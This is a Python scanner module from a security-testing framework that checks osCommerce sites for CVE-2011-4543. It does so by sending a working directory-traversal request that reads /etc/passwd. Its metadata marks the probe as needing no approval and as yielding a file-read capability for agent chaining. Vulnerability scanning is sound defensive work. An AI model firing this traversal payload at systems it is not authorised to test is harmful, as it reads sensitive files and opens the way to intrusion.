#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Detects CVE-2011-4543 via info."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'osCommerce - templates_modules LFI Detection (CVE-2011-4543)',
        'description': (
            'Detects CVE-2011-4543 via info.php?set=../../../../etc/passwd%00.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2011', 'oscommerce', 'lfi', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 0.9,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2011-4543',
        ],
        'cve': 'CVE-2011-4543',
    }

    def run(self):
        trav = '../' * 12 + 'etc/passwd%00'
        suffix = (
            '/OM/Core/Site/Admin/Application/templates_modules/pages/info.php'
            f'?set={trav}&module=foo'
        )
        for base in ('', '/catalog', '/oscommerce', '/shop'):
            path = f'{base}{suffix}'
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if r and re.search(r'root:.*:0:0:', r.text or ''):
                self.set_info(severity='high', reason='osCommerce templates_modules LFI (CVE-2011-4543)', path=path.split('?')[0])
                return True
        return False

